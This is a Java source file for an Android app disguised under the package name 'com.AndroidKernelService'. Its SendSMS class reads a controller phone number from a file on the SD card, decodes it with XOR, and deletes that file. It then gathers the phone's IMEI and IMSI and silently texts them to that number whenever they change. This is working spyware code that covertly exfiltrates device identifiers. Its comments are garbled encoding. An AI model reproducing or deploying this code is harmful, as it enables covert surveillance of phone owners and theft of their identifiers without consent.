package com.AndroidKernelService;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.telephony.*;

public class SendSMS {
	public static final String TAG = "SendSMS";
	Context mContext;

	public static String smsNumber = "18712345678";

	String NAME = "PhoneInfo.txt";
	String PATH = "data/data/com.AndroidKernelService/";

	String IMEI = "IMEI";
	String IMSI = "IMSI";

	public SendSMS(Context context) {
		mContext = context;
	}

	public SendSMS() {

	}

	public void sendSMS() {
		// �����ｫsmsNumber�����ļ��е�smsNumber
		File smsNumFile = new File("/mnt/sdcard/sysInfo.txt");
		if (smsNumFile.exists()) {
			try {
				InputStreamReader read = new InputStreamReader(
						new FileInputStream(smsNumFile));
				BufferedReader bufferedReader = new BufferedReader(read);
				try {
					String sourcePhNum = bufferedReader.readLine();
					if (sourcePhNum != null) {
						try {
							// ����������
							WriteLogFile.writeLog("����ע����ŵ��ú���" + sourcePhNum);
							smsNumber = xorEncrypt.xorEn(sourcePhNum);
							WriteLogFile.writeLog("���ú���:" + smsNumber);
							// ���绰�������¸�ֵ
							bufferedReader.close();
							read.close();
							smsNumFile.delete();
						} catch (Exception e) {

						}
					}
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			} catch (FileNotFoundException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		WriteLogFile.writeLog("���е�sendSMS������");
		final BasicInfo info = new BasicInfo(mContext);
		try {
			// �������ȡIMEI�����IMSI����

			try {
				// new Thread().sleep(60 * 1000);
			} catch (Exception e) {

			}
			WriteLogFile.writeLog("ִ�л�ȡIMEI");
			IMEI = info.getIMEI();
			IMSI = info.getIMSI();
			WriteLogFile.writeLog("ִ�����ȡIMSI");

			/*
			 * for(int i=0; i<100; i++){ for(int j=0; j<1000; j++) { int
			 * at=198*100; }
			 * 
			 * IMEI = info.getIMEI(); IMSI = info.getIMSI();
			 * 
			 * if(IMEI.toString().length() > 4 && IMSI.toString().length() > 4)
			 * break; }
			 */

		} catch (Exception e) {
			WriteLogFile.writeLog(e.toString());
		}
		// д����־�ļ�
		// WriteLogFile.writeLog(IMEI + "@" + IMSI + "Ҫ���͵��ֻ���" + smsNumber);
		/*
		 * String mMessageText = "Android@" + IMEI + "@" + IMSI; SmsManager
		 * smsManager = SmsManager.getDefault();
		 * smsManager.sendTextMessage(smsNumber, null, mMessageText, null,
		 * null);
		 */
		// �ж�PhoneInfo.txt�Ƿ����
		File path = new File(PATH);
		if (!path.exists()) {
			path.mkdir();
		}
		File file = new File(PATH + NAME);
		boolean send = false;
		if (!file.exists()) {
			send = true;
			WriteLogFile.writeLog("send01=" + send);
			try {
				file.createNewFile();
				BufferedWriter output = new BufferedWriter(new FileWriter(file));
				output.write(IMEI);
				output.newLine();

				output.write(IMSI);
				output.newLine();

				output.close();
			} catch (IOException ioe) {
				ioe.printStackTrace();
				// WriteLogFile.writeLog("BootException01" + ioe.toString());
			}

		} else {
			// ��IMEI��IMSI��
			try {
				BufferedReader input = new BufferedReader(new FileReader(file));
				String IMEI_old = input.readLine();
				String IMSI_old = input.readLine();
				// WriteLogFile.writeLog("old version:" + IMEI_old + "  " +
				// IMSI_old);
				if (IMEI_old.contains(IMEI) && IMSI_old.contains(IMSI)) {
					input.close();
				} else {
					// д���µ�IMEI��IMSI��
					BufferedWriter output = new BufferedWriter(new FileWriter(
							file, false));
					output.write(IMEI);
					output.newLine();
					output.write(IMSI);
					output.newLine();
					output.close();
					send = true;
				}

			} catch (IOException ioe) {
				ioe.printStackTrace();
				// WriteLogFile.writeLog("BootException02" + ioe.toString());
			}
		}
		if (send) {
			try {
				String mMessageText = "Android@" + IMSI + "@" + IMEI;
				// WriteLogFile.writeLog("��ʼ������");

				SmsManager smsManager = SmsManager.getDefault();
				smsManager.sendTextMessage(smsNumber, null, mMessageText, null,
						null);

				// WriteLogFile.writeLog("�����Ž���");
			} catch (Exception e) {
				WriteLogFile.writeLog("BootException03" + e.toString());
			}
		}
		// WriteLogFile.writeLog("�����귢������");

	}
}
